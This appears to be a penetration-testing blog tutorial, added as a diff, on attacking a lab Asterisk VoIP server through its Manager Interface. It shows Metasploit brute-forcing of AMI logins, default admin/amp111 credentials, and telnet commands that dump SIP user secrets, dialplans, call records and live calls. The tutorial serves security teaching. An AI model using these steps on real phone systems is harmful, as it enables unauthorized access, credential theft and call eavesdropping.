@@ -1,0 +1,117 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Penetration Testing on VoIP Asterisk Server (Part 2)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-on-voip-asterisk-server-part-2/" rel="bookmark"><time class="entry-date published" datetime="2020-04-30T09:52:29+00:00">April 30, 2020</time><time class="updated" datetime="2025-06-04T15:51:48+00:00">June 4, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In the previous article we learned about Enumeration, Information Gathering, Call Spoofing. We introduced a little about the Asterisk Server. This time we will focus more on the Asterisk Manager Interface and some of the commands that we can run on the Asterisk server, and we will also examine the AMI Brute force Attack.</span></p>
+<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li class="ai-optimize-8"><span style="color: #000000;">Introduction to AMI</span></li>
+<li class="ai-optimize-9"><span style="color: #000000;">AMI Setup</span></li>
+<li class="ai-optimize-10"><span style="color: #000000;">AMI Bruteforce Attack</span></li>
+<li class="ai-optimize-11"><span style="color: #000000;">AMI Login</span></li>
+<li class="ai-optimize-12"><span style="color: #000000;">AMI Help</span></li>
+<li class="ai-optimize-13"><span style="color: #000000;">Enumerating SIP Users</span></li>
+<li class="ai-optimize-14"><span style="color: #000000;">Enumerating Specific User</span></li>
+<li class="ai-optimize-15"><span style="color: #000000;">Enable Debugging</span></li>
+<li class="ai-optimize-16"><span style="color: #000000;">Enumerating Dial Plan</span></li>
+<li class="ai-optimize-17"><span style="color: #000000;">Enumerating Core Settings</span></li>
+<li class="ai-optimize-18"><span style="color: #000000;">Enumerating CDR (Call Detail Records)</span></li>
+<li class="ai-optimize-19"><span style="color: #000000;">Enumerate Live Calls</span></li>
+</ul>
+<h3 class="ai-optimize-20"><span style="color: #800000;">Introduction to AMI</span></h3>
+<p class="ai-optimize-21"><span style="color: #000000;">AMI means Asterisk Manager Interface; AMI allows the client program to connect the asterisk server and issues commands or read events using TCP port. By default, AMI port 5038.</span></p>
+<p class="ai-optimize-22"><span style="color: #000000;">With the Manager interface, we can control the PBX server, originate calls, check mailbox status, monitor the channels and SIP accounts, queues as well as execute Asterisk commands. We configure AMI setting by editing the config file located at etc/asterisk/manager.conf. By default, AMI is disabled, it can be enabled by making changes in manager.conf. AMI commands are called “actions”. The VOIP server generates “response”. AMI will also send “Events” containing various information messages about changes within the Asterisk.</span></p>
+<p class="ai-optimize-23"><span style="color: #000000;">While configuring the AMI, we can change Manager Headers and Response ID too. The manager can handle subscribes to extension status reports from all channels, which enable them to generate events when an extension or device changes state. There are lots of details in these events that may depend on the channel and device configuration. All channel’s or Trunk configuration file for more information in (/etc/asterisk/sip_custom.conf or /etc/asterisk/extensions_custom.conf)</span></p>
+<p class="ai-optimize-24"><span style="color: #000000;">Note: Before using AMI, make sure all the asterisk modules are loaded. If modules are not loaded the application might not send AMI actions.</span></p>
+<h3 class="ai-optimize-25"><span style="color: #800000;">AMI Setup</span></h3>
+<p class="ai-optimize-26"><span style="color: #000000;">The AMI setup requires that we make some configuration changes that we discussed in the Introduction. To make necessary changes, we need to log in to the VoIP server using SSH service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh 192.168.1.12
+vi /etc/asterisk/manager.conf</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zBg45xV9Ebg/Xqqb_WQQ5ZI/AAAAAAAAjz0/z66XVUnJTxcoT7OK_xHNYp64eG7LalOrQCLcBGAsYHQ/s1600/1.png"/></p>
+<p class="ai-optimize-27"><span style="color: #000000;">Make the following changes in the file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">enabled = yes
+port = 5038
+secret = amp111
+permit=0.0.0.0/255.255.255.0</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--_tVNWoWd9o/XqqcBmYlk4I/AAAAAAAAj0Q/vj68jP-qPlIXIvLohMWzh_LDPkud7PungCLcBGAsYHQ/s1600/2.png"/></p>
+<p class="ai-optimize-28"><span style="color: #000000;">After saving configuration restart the VoIP server so that config change can come in effect.</span></p>
+<p class="ai-optimize-29"><span style="color: #000000;">Now, let’s see if we have the port 5038 running. Let’s perform a nmap scan to confirm the AMI port is opened.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p5038 192.168.1.12</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PMbqd9v--9U/XqqcBy_iJzI/AAAAAAAAj0U/YAGVD9opGZA_jaNkG1TocAbIV_Qn8c12ACLcBGAsYHQ/s1600/3.png"/></p>
+<p class="ai-optimize-30"><span style="color: #000000;">As we can see that AMI is working on port 5038.</span></p>
+<h3 class="ai-optimize-31"><span style="color: #800000;"><strong>AMI Bruteforce Attack</strong></span></h3>
+<p class="ai-optimize-32"><span style="color: #000000;">For brute force, we create a dictionary of possible users and passwords. We are going to use the asterisk_login auxiliary for this attack.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/voip/asterisk_login
+set rhosts 192.168.1.12
+set user_file /root/Desktop/unix_users.txt
+set pass_file /root/Desktop/unix_passwords.txt
+set stop_on_success true
+run</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-9x2lmFcYcAE/XqqcCW_Cb7I/AAAAAAAAj0Y/W0GbrqIyCfY8QXYLS6u8SaDXrGy9WKPXwCLcBGAsYHQ/s1600/4.png"/></p>
+<p class="ai-optimize-33"><span style="color: #000000;">Here, we can see that we can extract the AMI login username and Password. Most of the Asterisk-based VoIP server default username “admin” and password “amp111”.</span></p>
+<h3 class="ai-optimize-34"><span style="color: #e69999;"><span style="color: #800000;">AMI Login</span> </span></h3>
+<p class="ai-optimize-35"><span style="color: #000000;">Now let’s try logging on the Asterisk server using the credentials. We can use telnet for connecting to the AMI. After connecting we need to tell the AMI what kind of action we want to perform. In this instance, we are trying to login. So, after providing the action, we give the credentials and get access. Here we can see that we have the system privileges. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet 192.168.1.12 5038
+Action: Login
+Username: admin
+Secret: amp111</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-nI1gu5IVzfo/XqqcCmTJxXI/AAAAAAAAj0c/26qy5vgBmEw-0ZJbiScJFlXXKTGzEjt8ACLcBGAsYHQ/s1600/5.png"/></p>
+<h3 class="ai-optimize-36"><span style="color: #800000;">AMI Help</span></h3>
+<p class="ai-optimize-37"><span style="color: #000000;">As we don’t know much about the command that can be used to work around the Asterisk. We ran the help command to get a better understand of all the different tasks that can be performed using the AMI.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action: Command
+Command: help</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Pw6-5b8uqUc/XqqcCmze6KI/AAAAAAAAj0g/CnzDffT8mT8P-_-Y5c5lQFOO9prTCD19wCLcBGAsYHQ/s1600/6.png"/></p>
+<h3 class="ai-optimize-38"><span style="color: #e69999;"><span style="color: #800000;">Enumerating SIP Users</span> </span></h3>
+<p class="ai-optimize-39"><span style="color: #000000;">Let’s enumerate the SIP User’s data, which can have the Extensions, Usernames, and their respective secrets. For this, we will need to specify the action. We use “command” as action. After specifying we ran the command that will show us the data of the SIP Users.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action: command
+Command:  sip show users</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-JnLz4gEShvs/XqqcDcW739I/AAAAAAAAj0k/fwbfyR2FXngLOSRmTujeF_Lq8r8wnvHwQCLcBGAsYHQ/s1600/7.png"/></p>
+<p class="ai-optimize-40"><span style="color: #000000;">Here, we found the 4-sip user id’s and password.</span></p>
+<h3 class="ai-optimize-41"><span style="color: #800000;">Enumerating Specific User</span></h3>
+<p class="ai-optimize-42"><span style="color: #000000;">We found 4 users in the previous practical. Now let’s enumerate information about one of the particular user. The action will remain the same for this as well. But we will use the username for targeting a particular user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action: command
+Command:  sip show peer 2001</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--Koa3TravtU/XqqcEIr-NxI/AAAAAAAAj0o/VaQ56_93SPcJPZM74Mgb0MNnTLRj6IVFQCLcBGAsYHQ/s1600/8.png"/></p>
+<p class="ai-optimize-43"><span style="color: #000000;">The specific SIP peer details are displayed here. If it was set to that specific user, we may obtain the MD5 passwords. We might also determine this user’s permissions. Additionally, we were able to view this user’s Caller ID.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-5dhYfs1dPG8/XqqcEE5QXrI/AAAAAAAAj0s/4dbdRIXMFcUH0YbEfRo5Hh7t9k9_sQ6hACLcBGAsYHQ/s1600/9.png"/></p>
+<p class="ai-optimize-44"><span style="color: #000000;">We can also find the Mail Box details, Server IP details. Here, IP means the IP network registration allowed for that user. We could see what kind of device the user uses as well.</span></p>
+<h3 class="ai-optimize-45"><span style="color: #800000;">Enable Debugging</span></h3>
+<p class="ai-optimize-46"><span style="color: #000000;">We can use debugging to monitor the hardware configuration and identify fault errors, as well as observe the configuration, call handling information, code, and modules.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action: Command
+Command: sip set debug on</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-3DWihq66hcw/Xqqb_pIhteI/AAAAAAAAjz4/awR1jrnCdFsZF8hYP3cjEWMspEaGyI2HQCLcBGAsYHQ/s1600/10.png"/></p>
+<p class="ai-optimize-47"><span style="color: #000000;">Here we can see SIP debugging enabled. If in case we do not turn off debug backend it will run until then we stop.</span></p>
+<h3 class="ai-optimize-48"><span style="color: #800000;">Enumerating Dial Plan</span></h3>
+<p class="ai-optimize-49"><span style="color: #000000;">Asterisk based VoIP server common dial plan context from-internal it shows about call routing information<strong>.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action: Command
+Command: dialplan show from-internal</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-iChua0lxFbA/Xqqb_jv08eI/AAAAAAAAjz8/sVh6iJYlSyUxVAX_aKR2xszs66q336j9ACLcBGAsYHQ/s1600/11.png"/></p>
+<p class="ai-optimize-50"><span style="color: #000000;">As we can see here to type of dial plan available by default one is from-internal-xfer and another one bad-number.</span></p>
+<h3 class="ai-optimize-51"><span style="color: #800000;">Enumerating Core Settings</span></h3>
+<p class="ai-optimize-52"><span style="color: #000000;">It will show about all the asterisk default information, asterisk version, build options, verbosity information, start time, free memory load, AMI information, default language, call record feature,</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-2FWINxLYfqs/XqqcAlxJY0I/AAAAAAAAj0E/3qb7NYKzxcsTSdHI2zIriHUrjq-yGNkrwCLcBGAsYHQ/s1600/12.png"/></p>
+<h3 class="ai-optimize-53"><span style="color: #800000;">Enumerating CDR (Call Detail Records)</span></h3>
+<p class="ai-optimize-54"><span style="color: #000000;">CDR is the most useful service in asterisk. CDR is the system that provides one or more call records for each call depending on what version of Asterisk. It is useful for administrators who need a simple way to track what calls have taken place on the Asterisk system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action: Command
+Command: cdr show status</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-eok6playqEE/XqqcAtEITPI/AAAAAAAAj0A/7ThTY9lrfIYhssv3xyQqPO5wDr69BQTzACLcBGAsYHQ/s1600/13.png"/></p>
+<p class="ai-optimize-55"><span style="color: #000000;">Here we enable CDR logging, run the database server, and register CDR backed to MySQL. We can enumerate the CDR database details using the following command.</span></p>
+<p class="ai-optimize-56"><span style="color: #000000;">The user connected to the database for a certain amount of time and entered logs in the database, as shown in the screenshot below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action Command
+Command: cdr mysql status</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Pdsy8JTWquU/XqqcAz4fP1I/AAAAAAAAj0I/H67--cuHOF0aRO08kUHn67TOvdMQA-0xQCLcBGAsYHQ/s1600/14.png"/></p>
+<h3 class="ai-optimize-57"><span style="color: #800000;">Enumerate Live Calls</span></h3>
+<p class="ai-optimize-58"><span style="color: #000000;">We can also enumerate the active calls and processed call list which tells us about different calls that are currently in session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Action: Command
+Command: core show calls</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-kjOIW21_UGM/XqqcBYXSHOI/AAAAAAAAj0M/kOvjwxtSjvkfVG7bDNFWrWmRe9t1-Z3dwCLcBGAsYHQ/s1600/15.png"/></p>
+<p class="ai-optimize-59"><span style="color: #000000;">If you want to know more commands that you can use to enumerate an AMI, please refer to the official <a style="color: #000000;" href="https://docs.asterisk.org/About-the-Project/">Asterisk Wiki.</a></span></p>
+<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Penetration Testing. Follow this</span> <a href="https://www.hackingarticles.in/category/penetration-testing/">Link.</a></p>
+<p class="ai-optimize-60"><span style="color: #000000;"><strong>Author: </strong>Madhava Rao Yejarla is an Ethical Hacker, Security Analyst, Penetration Tester from India. Contact on <strong><a style="color: #000000;" href="https://www.linkedin.com/in/yejarla-madhava-rao-b285b5b1/">LinkedIn</a> </strong>or <strong><a style="color: #000000;" href="https://twitter.com/YejarlaMadhava" data-saferedirecturl="https://www.google.com/url?q=https://www.linkedin.com/mwlite/in/yejarla-madhava-rao-b285b5b1&amp;source=gmail&amp;ust=1586846757025000&amp;usg=AFQjCNFC8mQwK4xoGPpotVKcAlO7SIxW-A">Twitter</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
